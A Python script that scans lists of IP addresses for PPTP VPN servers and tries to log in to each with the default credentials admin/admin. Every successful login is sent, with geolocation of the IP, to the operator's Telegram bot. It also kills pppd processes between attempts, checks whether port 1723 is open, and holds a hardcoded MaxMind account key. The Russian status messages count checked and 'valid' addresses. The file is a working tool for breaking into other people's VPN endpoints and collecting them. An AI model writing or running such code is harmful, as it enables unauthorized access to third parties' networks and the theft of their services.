import pytz
import socket
import requests as r
from minfraud import Client
from datetime import datetime
from subprocess import call, check_output

from utils.files_utils import add_checked

from config import CHAT_ID, TOKEN

method = "sendMessage"


def ipif(ip):
    rs = r.get(f"http://ipinfo.io/{ip}/json").json()
    try:
        postal = rs["postal"]
    except:
        postal = "N/A"
    return rs["region"], rs["city"], postal


def risk(ip):
    client = Client(466625, "jaP4lfmamWSXXB5q")
    rs = client.score({"device": {"ip_address": ip}})
    return rs.ip_address.risk


def send(text):
    r.get(
        f"https://api.telegram.org/bot{TOKEN}/sendMessage",
        params={"chat_id": CHAT_ID, "text": text},
    )


def pskl():
    rs = check_output("ps", shell=True)
    for i in rs.decode().split("\n"):
        sr = i.strip().replace(" " * 4, "'")
        if "pptp" in sr or "pppd" in sr or "pptpgw" in sr or "pptpcm" in sr:
            call(f"kill -9 {sr.split(' ')[0]}", shell=True)


def pptp(ip, log, pas):
    cmd = f'pppd pty "pptp {ip} --nolaunchpppd" user {log} password {pas} lock noauth nodeflate updetach > outlog'
    rs = call(cmd, shell=True)
    if "remote IP address" in open("outlog", "r").read():
        return ip, log, pas


def process_pptp_file(filename):
    pptps = open(filename).read().split("\n")
    checked_count = 0
    all_checked_count = 0
    success_ip = 0

    for ips in list(pptps):
        if checked_count == 10:
            send(f"Вообщем проверено {all_checked_count} IP-адресов")
            checked_count = 0

        try:
            iss = pptp(ips, "admin", "admin")
            text = f"{iss[0]} - pptp\nLogPass={iss[1]}:{iss[2]}\nState:{ipif(iss[0])[0]}/{ipif(iss[0])[2]}"
            send(text)
            print(f"proxy: {ips} - is work")
            pskl()

            checked_count += 1
            all_checked_count += 1
            success_ip += 1

        except:
            add_checked(ips)
            pskl()
            print(f"proxy: {ips} - isn't work")

            checked_count += 1
            all_checked_count += 1

            continue

    send(
        f"Проверено {all_checked_count} IP-адресов на валидность\nВалидных: {success_ip}"
    )


def process_pptp_list(ip_list):
    checked_count = 0
    all_checked_count = 0
    success_ip = 0

    for ip in list(ip_list):
        if checked_count == 10:
            send(f"Вообщем проверено {all_checked_count} IP-адресов")
            checked_count = 0

        try:
            iss = pptp(ip, "admin", "admin")
            text = f"{iss[0]} - pptp\nLogPass={iss[1]}:{iss[2]}\nState:{ipif(iss[0])[0]}/{ipif(iss[0])[2]}"
            send(text)
            print(f"proxy: {ip} - is work")
            pskl()

            checked_count += 1
            all_checked_count += 1
            success_ip += 1

        except:
            add_checked(ip)
            pskl()
            print(f"proxy: {ip} - isn't work")

            checked_count += 1
            all_checked_count += 1

            continue

    send(
        f"Проверено {all_checked_count} IP-адресов на валидность\Валдиных: {success_ip}"
    )


def is_port_open(ip, port=1723, timeout=3):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        return result == 0
